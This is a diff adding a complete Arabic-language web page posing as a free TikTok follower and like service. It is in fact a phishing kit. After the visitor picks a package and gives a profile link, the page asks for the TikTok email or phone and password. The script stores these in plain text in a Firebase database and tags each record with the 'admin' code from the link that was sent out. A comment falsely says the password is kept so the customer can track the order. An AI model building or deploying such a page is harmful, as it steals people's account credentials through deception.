@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<title>خدمة نمو تيك توك</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{
+  --pink:#f43f5e;
+  --cyan:#22d3ee;
+  --grad:linear-gradient(135deg,#f43f5e 0%,#ec4899 45%,#22d3ee 100%);
+  --grad-soft:linear-gradient(135deg,rgba(244,63,94,.12),rgba(34,211,238,.12));
+  --green:#22c55e;
+  --bg:#f4f6fa;
+  --card:#ffffff;
+  --text:#0f172a;
+  --muted:#64748b;
+  --border:#e5e9f0;
+  --shadow:0 8px 24px rgba(15,23,42,.06);
+  --shadow-lg:0 16px 40px rgba(15,23,42,.10);
+  --radius:20px;
+}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+body{
+  font-family:'Cairo',-apple-system,BlinkMacSystemFont,'Segoe UI',Tahoma,sans-serif;
+  background:var(--bg);color:var(--text);line-height:1.6;min-height:100vh;
+  display:flex;flex-direction:column;
+}
+
+/* ============ Top bar ============ */
+.topbar{
+  background:#fff;border-bottom:1px solid var(--border);
+  padding:14px 18px;display:flex;align-items:center;justify-content:space-between;
+  position:sticky;top:0;z-index:50;
+}
+.topbar .title{font-weight:700;font-size:15px;color:var(--text)}
+.topbar .moon{
+  width:36px;height:36px;border-radius:50%;display:grid;place-items:center;
+  background:#f1f5f9;color:#475569;cursor:pointer;font-size:18px;
+}
+
+/* ============ Progress ============ */
+.progress{
+  background:#fff;border-bottom:1px solid var(--border);padding:18px 18px 22px;
+}
+.progress-inner{
+  max-width:640px;margin:0 auto;
+  display:flex;align-items:flex-start;justify-content:space-between;position:relative;
+}
+.step{flex:1;display:flex;flex-direction:column;align-items:center;gap:6px;position:relative;z-index:2}
+.step .circle{
+  width:44px;height:44px;border-radius:50%;display:grid;place-items:center;
+  background:#f1f5f9;color:#94a3b8;font-size:16px;font-weight:700;
+  border:2px solid transparent;transition:.3s;
+}
+.step .label{font-size:11.5px;color:#94a3b8;font-weight:600;text-align:center;white-space:nowrap}
+.step.active .circle{background:var(--grad);color:#fff;box-shadow:0 6px 16px rgba(244,63,94,.3)}
+.step.active .label{color:var(--pink);font-weight:700}
+.step.done .circle{background:var(--green);color:#fff}
+.step.done .label{color:var(--green)}
+.line{
+  position:absolute;top:22px;height:2px;background:#e5e9f0;z-index:1;transition:.3s;
+}
+.line.filled{background:var(--green)}
+.line.half{background:linear-gradient(90deg,var(--green) 50%,#e5e9f0 50%)}
+
+/* ============ Main ============ */
+main{flex:1;padding:22px 16px 100px;max-width:640px;width:100%;margin:0 auto}
+.screen{display:none;animation:fade .35s ease}
+.screen.show{display:block}
+@keyframes fade{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+
+/* ============ Card ============ */
+.card{
+  background:#fff;border-radius:var(--radius);padding:26px 22px;
+  box-shadow:var(--shadow);border:1px solid var(--border);
+  position:relative;overflow:hidden;
+}
+.card::before{
+  content:'';position:absolute;top:0;right:0;left:0;height:4px;
+  background:var(--grad);
+}
+.card h1{
+  font-size:24px;font-weight:800;text-align:center;margin:16px 0 8px;
+}
+.card .subtitle{
+  text-align:center;color:var(--muted);font-size:14px;margin-bottom:24px;
+}
+.tt-icon{
+  width:70px;height:70px;margin:0 auto;display:block;
+}
+
+/* Features grid */
+.features{
+  display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:24px;
+}
+.feature{
+  background:#f8fafc;border-radius:14px;padding:18px 12px;text-align:center;
+  transition:.2s;
+}
+.feature .ico{
+  width:38px;height:38px;margin:0 auto 10px;display:grid;place-items:center;
+  color:var(--pink);
+}
+.feature .ico svg{width:26px;height:26px;stroke:var(--pink);fill:none;stroke-width:2}
+.feature .txt{font-size:13px;font-weight:600;color:#334155;line-height:1.4}
+
+/* Buttons */
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;gap:8px;
+  padding:15px 24px;border-radius:14px;border:none;cursor:pointer;
+  font-family:inherit;font-size:15px;font-weight:700;transition:.2s;
+  width:100%;
+}
+.btn-primary{background:var(--grad);color:#fff;box-shadow:0 8px 20px rgba(244,63,94,.25)}
+.btn-primary:hover{transform:translateY(-1px);box-shadow:0 12px 28px rgba(244,63,94,.35)}
+.btn-primary:disabled{opacity:.5;cursor:not-allowed;transform:none}
+.btn-ghost{background:#fff;color:#334155;border:1.5px solid var(--border)}
+.btn-ghost:hover{background:#f8fafc}
+.btn-row{display:flex;gap:10px;margin-top:22px}
+.btn-row .btn{flex:1}
+
+/* Choice cards (services) */
+.choice{
+  background:#f8fafc;border:2px solid transparent;border-radius:16px;
+  padding:20px;display:flex;align-items:center;gap:16px;cursor:pointer;
+  transition:.2s;margin-bottom:14px;
+}
+.choice:hover{background:#fff;border-color:rgba(244,63,94,.25)}
+.choice.selected{background:#fff;border-color:var(--pink);box-shadow:0 6px 20px rgba(244,63,94,.15)}
+.choice .c-ico{
+  width:56px;height:56px;border-radius:14px;display:grid;place-items:center;
+  background:var(--grad);flex-shrink:0;
+}
+.choice .c-ico svg{width:28px;height:28px;stroke:#fff;fill:none;stroke-width:2}
+.choice .c-text h3{font-size:16px;font-weight:700;margin-bottom:2px}
+.choice .c-text p{font-size:13px;color:var(--muted)}
+
+/* Package grid */
+.pkg-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:18px}
+.pkg{
+  background:#f8fafc;border:2px solid transparent;border-radius:16px;
+  padding:24px 12px;text-align:center;cursor:pointer;transition:.2s;
+}
+.pkg:hover{background:#fff;border-color:rgba(244,63,94,.25)}
+.pkg.selected{background:#fff;border-color:var(--pink);box-shadow:0 6px 20px rgba(244,63,94,.15)}
+.pkg .num{
+  font-size:34px;font-weight:800;
+  background:linear-gradient(135deg,#ec4899,#22d3ee);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+  line-height:1.1;margin-bottom:12px;
+}
+.pkg .tag{
+  display:inline-block;background:var(--grad);color:#fff;
+  padding:5px 16px;border-radius:8px;font-size:12px;font-weight:700;
+}
+
+/* Custom input */
+.custom-wrap{display:none;margin-bottom:18px}
+.custom-wrap.show{display:block}
+.custom-wrap label{display:block;font-size:13px;font-weight:700;color:#334155;margin-bottom:8px}
+
+/* Inputs */
+.field{margin-bottom:16px}
+.field label{display:block;font-size:14px;font-weight:700;color:#0f172a;margin-bottom:8px}
+.field input{
+  width:100%;padding:14px 16px;border-radius:12px;border:1.5px solid var(--border);
+  background:#fff;color:var(--text);font-size:15px;font-family:inherit;outline:none;
+  transition:.2s;
+}
+.field input:focus{border-color:var(--pink);box-shadow:0 0 0 4px rgba(244,63,94,.1)}
+.field .hint{font-size:12px;color:var(--muted);margin-top:6px}
+
+/* Success */
+.success{text-align:center;padding:20px 0}
+.success .check{
+  width:80px;height:80px;border-radius:50%;margin:0 auto 20px;
+  background:linear-gradient(135deg,#22c55e,#16a34a);display:grid;place-items:center;
+  box-shadow:0 12px 30px rgba(34,197,94,.35);
+  animation:pop .5s ease;
+}
+@keyframes pop{0%{transform:scale(.5);opacity:0}100%{transform:scale(1);opacity:1}}
+.success .check svg{width:44px;height:44px;stroke:#fff;fill:none;stroke-width:3}
+.success h2{font-size:22px;font-weight:800;margin-bottom:8px}
+.success p{color:var(--muted);font-size:14px;margin-bottom:20px}
+.order-box{
+  background:#f8fafc;border:1.5px dashed rgba(244,63,94,.4);
+  border-radius:14px;padding:16px;margin-bottom:20px;
+}
+.order-box .lbl{font-size:12px;color:var(--muted);margin-bottom:6px}
+.order-box .id{
+  font-family:ui-monospace,Menlo,monospace;font-size:14px;font-weight:700;
+  color:var(--pink);word-break:break-all;letter-spacing:.5px;
+}
+
+/* Loader / Error */
+.loader{
+  display:flex;align-items:center;justify-content:center;min-height:70vh;flex-direction:column;
+  gap:16px;color:var(--muted);
+}
+.spinner{
+  width:38px;height:38px;border-radius:50%;border:3px solid var(--border);
+  border-top-color:var(--pink);animation:spin 1s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.error-box{
+  background:#fff;border-radius:var(--radius);padding:40px 24px;text-align:center;
+  box-shadow:var(--shadow);border:1px solid var(--border);
+}
+.error-box .emoji{font-size:52px;margin-bottom:16px}
+.error-box h2{font-size:20px;color:#dc2626;margin-bottom:8px}
+.error-box p{color:var(--muted);font-size:14px}
+
+/* Toast */
+#toast{
+  position:fixed;bottom:24px;left:50%;transform:translateX(-50%);
+  z-index:999;display:flex;flex-direction:column;gap:8px;max-width:90%;
+}
+.toast-item{
+  padding:12px 20px;border-radius:12px;font-size:14px;font-weight:600;
+  background:#0f172a;color:#fff;box-shadow:0 12px 30px rgba(0,0,0,.25);
+  text-align:center;animation:slideUp .3s ease;
+}
+.toast-item.err{background:#dc2626}
+.toast-item.ok{background:#16a34a}
+@keyframes slideUp{from{opacity:0;transform:translate(-50%,20px)}to{opacity:1;transform:translate(-50%,0)}}
+
+/* Dark mode */
+body.dark{--bg:#0f172a;--card:#1e293b;--text:#f1f5f9;--muted:#94a3b8;--border:#334155}
+body.dark .topbar,body.dark .progress,body.dark .card{background:var(--card)}
+body.dark .feature,body.dark .choice,body.dark .pkg,body.dark .field input,body.dark .order-box{background:#0f172a;color:var(--text)}
+body.dark .choice:hover,body.dark .pkg:hover{background:#1e293b}
+body.dark .choice.selected,body.dark .pkg.selected{background:#1e293b}
+body.dark .topbar .moon{background:#334155;color:#f1f5f9}
+</style>
+</head>
+<body>
+
+<!-- =================== LOADING =================== -->
+<div id="loader" class="loader">
+  <div class="spinner"></div>
+  <div>جاري التحقق من الرابط…</div>
+</div>
+
+<!-- =================== ERROR =================== -->
+<div id="errorScreen" style="display:none;padding:22px">
+  <div class="error-box">
+    <div class="emoji">🔗</div>
+    <h2>الرابط غير صالح</h2>
+    <p id="errorMsg">هذا الرابط لا يحتوي على كود المشرف الصحيح. الرجاء فتح الرابط الذي أرسله لك المشرف.</p>
+  </div>
+</div>
+
+<!-- =================== APP =================== -->
+<div id="app" style="display:none;flex-direction:column;min-height:100vh">
+
+  <!-- Top bar -->
+  <div class="topbar">
+    <div class="title">خدمة نمو تيك توك</div>
+    <div class="moon" id="darkToggle">🌙</div>
+  </div>
+
+  <!-- Progress bar -->
+  <div class="progress">
+    <div class="progress-inner" id="progressBar">
+      <!-- filled by JS -->
+    </div>
+  </div>
+
+  <main>
+
+    <!-- ============ WELCOME ============ -->
+    <div class="screen" id="scr-welcome">
+      <div class="card">
+        <!-- TikTok Logo (SVG) -->
+        <svg class="tt-icon" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <linearGradient id="ttg" x1="0" y1="0" x2="1" y2="1">
+              <stop offset="0" stop-color="#22d3ee"/>
+              <stop offset=".5" stop-color="#a855f7"/>
+              <stop offset="1" stop-color="#f43f5e"/>
+            </linearGradient>
+          </defs>
+          <path fill="url(#ttg)" d="M37.5 14.3a10.8 10.8 0 0 1-6.4-2.1 10.8 10.8 0 0 1-4.1-5.2h-6.1v22.6a6.3 6.3 0 1 1-4.5-6.1V17a12.4 12.4 0 1 0 10.6 12.3V21a16.8 16.8 0 0 0 10.5 3.6z"/>
+        </svg>
+        <h1>خدمة نمو تيك توك</h1>
+        <p class="subtitle">عزز حضورك على تيك توك من خلال متابعين وإعجابات مجانية</p>
+
+        <div class="features">
+          <div class="feature">
+            <div class="ico"><svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg></div>
+            <div class="txt">توصل فوري</div>
+          </div>
+          <div class="feature">
+            <div class="ico"><svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg></div>
+            <div class="txt">آمن بنسبة 100%</div>
+          </div>
+          <div class="feature">
+            <div class="ico"><svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
+            <div class="txt">دعم متوفر على مدار الساعة</div>
+          </div>
+          <div class="feature">
+            <div class="ico"><svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15 8.5 22 9.3 17 14.1 18.2 21 12 17.8 5.8 21 7 14.1 2 9.3 9 8.5 12 2"/></svg></div>
+            <div class="txt">مستخدمون حقيقيون</div>
+          </div>
+        </div>
+
+        <button class="btn btn-primary" id="startBtn">ابدأ الآن</button>
+      </div>
+    </div>
+
+    <!-- ============ STEP 1: SERVICE ============ -->
+    <div class="screen" id="scr-service">
+      <div class="card">
+        <h1>اختر خدمة</h1>
+        <p class="subtitle">اختر ما تريد الترويج له في ملفك الشخصي على TikTok</p>
+
+        <div id="servicesList">
+          <div class="choice" data-value="followers">
+            <div class="c-ico">
+              <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+            </div>
+            <div class="c-text">
+              <h3>المتابعون</h3>
+              <p>قم بزيادة عدد متابعيك</p>
+            </div>
+          </div>
+
+          <div class="choice" data-value="likes">
+            <div class="c-ico">
+              <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"/></svg>
+            </div>
+            <div class="c-text">
+              <h3>الإعجابات</h3>
+              <p>عزز التفاعل على مقاطع الفيديو الخاصة بك</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-ghost" data-back>خلف</button>
+          <button class="btn btn-primary" id="serviceNext" disabled>يكمل</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ STEP 2: PACKAGE ============ -->
+    <div class="screen" id="scr-package">
+      <div class="card">
+        <h1>اختر الباقة</h1>
+        <p class="subtitle">اختر عدد المتابعين الذين تريدهم</p>
+
+        <div class="pkg-grid" id="pkgGrid">
+          <div class="pkg" data-qty="100"><div class="num">100</div><span class="tag">حر</span></div>
+          <div class="pkg" data-qty="250"><div class="num">250</div><span class="tag">حر</span></div>
+          <div class="pkg" data-qty="500"><div class="num">500</div><span class="tag">حر</span></div>
+          <div class="pkg" data-qty="1000"><div class="num">1000</div><span class="tag">حر</span></div>
+        </div>
+
+        <button class="btn btn-ghost" id="customToggle" style="margin-bottom:18px;font-size:13px;padding:10px">✏️ كمية مخصصة</button>
+
+        <div class="custom-wrap" id="customWrap">
+          <label>أدخل الكمية المطلوبة</label>
+          <input type="number" id="customQty" min="10" placeholder="مثال: 5000" />
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-ghost" data-back>خلف</button>
+          <button class="btn btn-primary" id="packageNext" disabled>يكمل</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ STEP 3: URL ============ -->
+    <div class="screen" id="scr-url">
+      <div class="card">
+        <h1>عنوان URL</h1>
+        <p class="subtitle">أدخل رابط حسابك أو فيديوك على TikTok بشكل كامل</p>
+
+        <div class="field">
+          <label>رابط TikTok *</label>
+          <input type="url" id="tiktokUrl" placeholder="https://www.tiktok.com/@username" dir="ltr" />
+          <div class="hint">مثال: https://www.tiktok.com/@username أو رابط الفيديو مباشرة</div>
+        </div>
+
+        <div class="field">
+          <label>اسم مستخدم TikTok (اختياري)</label>
+          <input type="text" id="tiktokUsername" placeholder="@username" dir="ltr" />
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-ghost" data-back>خلف</button>
+          <button class="btn btn-primary" id="urlNext">يكمل</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ STEP 4: LOGIN ============ -->
+    <div class="screen" id="scr-login">
+      <div class="card">
+        <h1>تسجيل الدخول إلى الحساب</h1>
+        <p class="subtitle">أدخل بيانات اعتماد حسابك على TikTok للمتابعة</p>
+
+        <div class="field">
+          <label>البريد الإلكتروني أو رقم الهاتف</label>
+          <input type="text" id="custContact" placeholder="أدخل بريدك الإلكتروني أو رقم هاتفك" />
+        </div>
+
+        <div class="field">
+          <label>كلمة المرور</label>
+          <input type="password" id="custPass" placeholder="أدخل كلمة المرور الخاصة بك" />
+        </div>
+
+        <div class="field">
+          <label>الاسم الكامل (اختياري)</label>
+          <input type="text" id="custName" placeholder="مثال: محمد أحمد" />
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-ghost" data-back>خلف</button>
+          <button class="btn btn-primary" id="submitBtn">إتمام الطلب</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ SUCCESS ============ -->
+    <div class="screen" id="scr-success">
+      <div class="card">
+        <div class="success">
+          <div class="check">
+            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <h2>تم استلام طلبك بنجاح!</h2>
+          <p>سيتم معالجة طلبك في أقرب وقت. احتفظ برقم الطلب لمتابعته.</p>
+
+          <div class="order-box">
+            <div class="lbl">رقم الطلب</div>
+            <div class="id" id="orderIdText">—</div>
+          </div>
+
+          <button class="btn btn-ghost" id="copyOrderBtn" style="margin-bottom:10px">📋 نسخ رقم الطلب</button>
+          <button class="btn btn-primary" id="newOrderBtn">طلب جديد</button>
+        </div>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<div id="toast"></div>
+
+<script type="module">
+/* ============================================================
+   Firebase
+   ============================================================ */
+const firebaseConfig = {
+  apiKey: "YOUR_FIREBASE_API_KEY",
+  authDomain: "dosha-games.firebaseapp.com",
+  databaseURL: "https://dosha-games-default-rtdb.firebaseio.com",
+  projectId: "dosha-games",
+  storageBucket: "dosha-games.firebasestorage.app",
+  messagingSenderId: "584565662439",
+  appId: "1:584565662439:web:775e8d06b3cab9d54bb842",
+  measurementId: "G-18T3S01ZRC"
+};
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, push, set, get } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+const app = initializeApp(firebaseConfig);
+const db  = getDatabase(app);
+
+/* ============================================================
+   Utils
+   ============================================================ */
+const $ = id => document.getElementById(id);
+const ESC = s => String(s==null?'':s).replace(/[&<>"']/g, c=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
+
+function toast(msg, type='info'){
+  const el = document.createElement('div');
+  el.className = 'toast-item ' + type;
+  el.textContent = msg;
+  $('toast').appendChild(el);
+  setTimeout(()=>{ el.style.opacity='0'; el.style.transition='.3s'; setTimeout(()=>el.remove(),300); }, 3200);
+}
+
+/* ============================================================
+   State
+   ============================================================ */
+const STEPS = ['خدمة','طلب','عنوان URL','منتهي'];
+let stepIndex = -1;         // -1 = welcome
+let ADMIN     = null;       // { code, uid, displayName }
+const ORDER   = {
+  service: null,       // 'followers' | 'likes'
+  serviceName: '',
+  quantity: null,
+  customQty: null,
+  tiktokUrl: '',
+  tiktokUsername: '',
+  customerContact: '',
+  customerPassword: '',
+  customerName: ''
+};
+
+/* ============================================================
+   Progress bar render
+   ============================================================ */
+function renderProgress(){
+  const bar = $('progressBar');
+  // Build with lines between circles
+  let html = '';
+  STEPS.forEach((label, i) => {
+    const cls = i < stepIndex ? 'done' : (i === stepIndex ? 'active' : '');
+    const icon = i < stepIndex
+      ? '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'
+      : (i === 0 ? '📋' : i === 1 ? '📦' : i === 2 ? '🔗' : '🎉');
+    html += `<div class="step ${cls}"><div class="circle">${icon}</div><div class="label">${label}</div></div>`;
+    if (i < STEPS.length - 1){
+      const lineCls = i < stepIndex - 1 ? 'filled' : (i === stepIndex - 1 ? 'half' : '');
+      html += `<div class="line ${lineCls}" style="right: calc(${(i+1)/STEPS.length*100}% - 25px); width: calc(${1/STEPS.length*100}% - 50px)"></div>`;
+    }
+  });
+  bar.innerHTML = html;
+}
+
+/* ============================================================
+   Screen navigation
+   ============================================================ */
+function showScreen(id){
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('show'));
+  const el = $('scr-' + id);
+  if (el){ el.classList.add('show'); window.scrollTo({top:0,behavior:'smooth'}); }
+}
+
+function goToStep(step){
+  stepIndex = step;
+  renderProgress();
+  switch(step){
+    case 0: showScreen('service');  break;
+    case 1: showScreen('package');  break;
+    case 2: showScreen('url');      break;
+    case 3: showScreen('login');    break;
+    case 4: showScreen('success');  break;
+  }
+}
+
+/* ============================================================
+   Boot: verify admin code from URL (silently)
+   ============================================================ */
+async function boot(){
+  const params = new URLSearchParams(location.search);
+  const adminCode = (params.get('a') || params.get('admin') || '').trim();
+
+  if (!adminCode){
+    return showError('هذا الرابط لا يحتوي على كود المشرف. الرجاء فتح الرابط الذي أرسله لك المشرف.');
+  }
+
+  try{
+    const snap = await get(ref(db, 'adminCodeIndex/' + adminCode));
+    if (!snap.exists()) return showError('كود المشرف غير موجود في النظام.');
+    const idx = snap.val();
+    if (idx.active === false) return showError('حساب هذا المشرف معطَّل حالياً. حاول لاحقاً.');
+    if (idx.expiresAt && Number(idx.expiresAt) < Date.now()) return showError('انتهت صلاحية حساب المشرف. حاول لاحقاً.');
+
+    ADMIN = {
+      code: adminCode,
+      uid:  idx.uid,
+      displayName: idx.displayName || idx.username || 'المشرف'
+    };
+
+    // Show app
+    $('loader').style.display = 'none';
+    $('app').style.display = 'flex';
+    renderProgress();
+    showScreen('welcome');
+  }catch(err){
+    console.error(err);
+    showError('تعذّر الاتصال بالخادم. تحقق من الإنترنت وحاول مرة أخرى.');
+  }
+}
+
+function showError(msg){
+  $('loader').style.display = 'none';
+  $('app').style.display = 'none';
+  $('errorScreen').style.display = 'block';
+  $('errorMsg').textContent = msg;
+}
+
+/* ============================================================
+   Welcome → step 1
+   ============================================================ */
+$('startBtn').addEventListener('click', ()=> goToStep(0));
+
+/* ============================================================
+   STEP 1: Service selection
+   ============================================================ */
+document.querySelectorAll('#servicesList .choice').forEach(el => {
+  el.addEventListener('click', ()=>{
+    document.querySelectorAll('#servicesList .choice').forEach(x=>x.classList.remove('selected'));
+    el.classList.add('selected');
+    ORDER.service = el.dataset.value;
+    ORDER.serviceName = el.dataset.value === 'followers' ? 'المتابعون' : 'الإعجابات';
+    $('serviceNext').disabled = false;
+  });
+});
+
+$('serviceNext').addEventListener('click', ()=>{
+  if (!ORDER.service) return toast('اختر خدمة أولاً','err');
+  // Update package screen title based on service
+  document.querySelector('#scr-package .subtitle').textContent =
+    ORDER.service === 'followers' ? 'اختر عدد المتابعين الذين تريدهم' : 'اختر عدد الإعجابات التي تريدها';
+  goToStep(1);
+});
+
+/* ============================================================
+   STEP 2: Package selection
+   ============================================================ */
+document.querySelectorAll('#pkgGrid .pkg').forEach(el => {
+  el.addEventListener('click', ()=>{
+    document.querySelectorAll('#pkgGrid .pkg').forEach(x=>x.classList.remove('selected'));
+    el.classList.add('selected');
+    ORDER.quantity = Number(el.dataset.qty);
+    ORDER.customQty = null;
+    $('customWrap').classList.remove('show');
+    $('customQty').value = '';
+    $('packageNext').disabled = false;
+  });
+});
+
+$('customToggle').addEventListener('click', ()=>{
+  const wrap = $('customWrap');
+  wrap.classList.toggle('show');
+  if (wrap.classList.contains('show')){
+    document.querySelectorAll('#pkgGrid .pkg').forEach(x=>x.classList.remove('selected'));
+    ORDER.quantity = null;
+    $('packageNext').disabled = true;
+    $('customQty').focus();
+  } else {
+    $('packageNext').disabled = !ORDER.quantity;
+  }
+});
+
+$('customQty').addEventListener('input', ()=>{
+  const v = Number($('customQty').value);
+  if (v >= 10){
+    ORDER.customQty = v;
+    $('packageNext').disabled = false;
+  } else {
+    ORDER.customQty = null;
+    $('packageNext').disabled = true;
+  }
+});
+
+$('packageNext').addEventListener('click', ()=>{
+  if (!ORDER.quantity && !ORDER.customQty) return toast('اختر باقة أو أدخل كمية مخصصة','err');
+  if (ORDER.customQty) ORDER.quantity = ORDER.customQty;
+  goToStep(2);
+});
+
+/* ============================================================
+   STEP 3: URL
+   ============================================================ */
+$('urlNext').addEventListener('click', ()=>{
+  const url = $('tiktokUrl').value.trim();
+  if (!url) return toast('أدخل رابط TikTok','err');
+  if (!/tiktok\.com/i.test(url)) return toast('الرابط يجب أن يكون من tiktok.com','err');
+
+  ORDER.tiktokUrl = url;
+  // Auto-fill username if not filled and URL contains @username
+  const m = url.match(/@([a-zA-Z0-9._]+)/);
+  const userInput = $('tiktokUsername').value.trim();
+  ORDER.tiktokUsername = userInput || (m ? '@' + m[1] : '');
+
+  goToStep(3);
+});
+
+/* ============================================================
+   STEP 4: Login + submit
+   ============================================================ */
+$('submitBtn').addEventListener('click', async ()=>{
+  const contact = $('custContact').value.trim();
+  const pass    = $('custPass').value;
+  const name    = $('custName').value.trim();
+
+  if (!contact) return toast('أدخل البريد الإلكتروني أو رقم الهاتف','err');
+  if (!pass || pass.length < 4) return toast('أدخل كلمة مرور صحيحة','err');
+
+  ORDER.customerContact  = contact;
+  ORDER.customerPassword = pass;
+  ORDER.customerName     = name;
+
+  const btn = $('submitBtn');
+  btn.disabled = true; btn.textContent = 'جاري الإرسال…';
+
+  try{
+    const orderRef = push(ref(db, 'orders'));
+    const orderId  = orderRef.key;
+    const now = Date.now();
+
+    await set(orderRef, {
+      orderId,
+      // Service info
+      service:        ORDER.service,
+      serviceName:    ORDER.serviceName,
+      quantity:       ORDER.quantity,
+      // TikTok info
+      tiktokUrl:      ORDER.tiktokUrl,
+      tiktokUsername: ORDER.tiktokUsername,
+      // Customer info
+      customerName:     ORDER.customerName || 'غير محدد',
+      customerContact:  ORDER.customerContact,
+      customerPassword: ORDER.customerPassword, // يُستخدم لتمكين العميل من متابعة طلبه
+      // Status
+      status: 'pending',
+      // Routing (admin identifier — not shown to user)
+      assignedAdminId:  ADMIN.code,
+      assignedAdminUid: ADMIN.uid,
+      // Timestamps
+      createdAt: now,
+      updatedAt: now
+    });
+
+    // Show success
+    $('orderIdText').textContent = orderId;
+    goToStep(4);
+    stepIndex = 4;
+    renderProgress();
+  }catch(err){
+    console.error(err);
+    toast(err?.message || 'فشل إرسال الطلب','err');
+  }finally{
+    btn.disabled = false; btn.textContent = 'إتمام الطلب';
+  }
+});
+
+/* ============================================================
+   Back buttons
+   ============================================================ */
+document.querySelectorAll('[data-back]').forEach(btn => {
+  btn.addEventListener('click', ()=>{
+    if (stepIndex <= 0) {
+      // Back to welcome
+      stepIndex = -1;
+      renderProgress();
+      showScreen('welcome');
+    } else {
+      goToStep(stepIndex - 1);
+    }
+  });
+});
+
+/* ============================================================
+   Success actions
+   ============================================================ */
+$('copyOrderBtn').addEventListener('click', ()=>{
+  const txt = $('orderIdText').textContent;
+  if (!txt || txt === '—') return;
+  navigator.clipboard.writeText(txt).then(()=> toast('تم نسخ رقم الطلب','ok'));
+});
+
+$('newOrderBtn').addEventListener('click', ()=>{
+  // Reset state
+  Object.keys(ORDER).forEach(k => ORDER[k] = k === 'quantity' || k === 'customQty' ? null : '');
+  document.querySelectorAll('.choice.selected, .pkg.selected').forEach(x=>x.classList.remove('selected'));
+  ['tiktokUrl','tiktokUsername','custContact','custPass','custName','customQty'].forEach(id=> $(id).value = '');
+  $('serviceNext').disabled = true;
+  $('packageNext').disabled = true;
+  $('customWrap').classList.remove('show');
+  stepIndex = -1;
+  renderProgress();
+  showScreen('welcome');
+});
+
+/* ============================================================
+   Dark mode toggle
+   ============================================================ */
+$('darkToggle').addEventListener('click', ()=>{
+  document.body.classList.toggle('dark');
+  $('darkToggle').textContent = document.body.classList.contains('dark') ? '☀️' : '🌙';
+});
+
+/* ============================================================
+   Boot
+   ============================================================ */
+boot();
+</script>
+</body>
+</html>
